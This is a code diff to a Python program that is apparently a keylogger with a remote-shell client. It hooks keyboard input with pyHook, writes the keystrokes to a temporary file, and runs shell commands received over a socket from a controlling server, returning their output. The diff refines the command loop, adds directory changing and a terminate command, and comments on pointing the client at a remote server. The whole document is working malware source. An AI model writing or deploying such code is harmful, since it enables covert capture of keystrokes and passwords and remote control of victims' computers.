@@ -8,9 +8,15 @@ import pythoncom
 import pyHook
 import tempfile
 import subprocess
+import os
 
 PORT = 8080
+# this is you want to run it remotely
+# SERVER = '' # ip address
+
+# this is if you want to run on the local machine
 SERVER = socket.gethostbyname(socket.gethostname())
+
 ADDR = (SERVER, PORT)
 
 FILE_NAME = tempfile.mkdtemp()+"\key_log.txt"
@@ -86,22 +92,26 @@ def stopKeyLogger():
 
 def get_shell(s):
     while True:
-
         command = client.recv(1024*1024).decode()
-        if command == "close":
+        if 'close' in command:
+            print('close shell')
             break
-        # cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
         output = subprocess.getoutput(command)
+        
         if output == "":
-            client.send(b"[no results]")
+            client.send(b' ')
+        
+        if 'cd' in command:
+            items = command.split(' ')
+            path = items[items.index('cd') + 1]
+            os.chdir(path)
+            
         
         client.send(output.encode())
         # client.send(cmd.stderr.read())
-    
-print(f"[CLIENT CONNECTED] -- {SERVER}, {type(SERVER)}")
 
 def client_func():
-    
     while True:
         # addr = SERVER
         command = client.recv(1024*1024).decode()
@@ -115,5 +125,9 @@ def client_func():
             stopKeyLogger()
         elif 'get_shell' in command:
             get_shell(SERVER)
+        elif 'terminate' in command:
+            client.close()
+            obj.UnhookKeyboard()
+            break
 
 client_func()
